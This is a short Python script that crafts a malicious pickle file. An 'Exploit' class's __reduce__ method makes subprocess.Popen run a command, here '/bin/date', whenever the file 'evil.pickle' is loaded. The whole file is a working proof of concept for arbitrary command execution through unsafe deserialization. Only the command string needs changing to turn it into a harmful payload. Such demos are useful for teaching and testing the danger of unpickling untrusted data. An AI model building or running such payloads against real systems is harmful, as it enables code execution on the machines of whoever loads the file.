import pickle
import subprocess

class Exploit(object):
  def __reduce__(self):
    fd = 4
    return (subprocess.Popen,
            (('/bin/date',), # args
             0, # bufsize
             None, # executable
             0, 1, 2 # std{in,out,err}
             ))

d = pickle.dumps(Exploit())
with open("evil.pickle", "wb") as f:
  f.write(d)



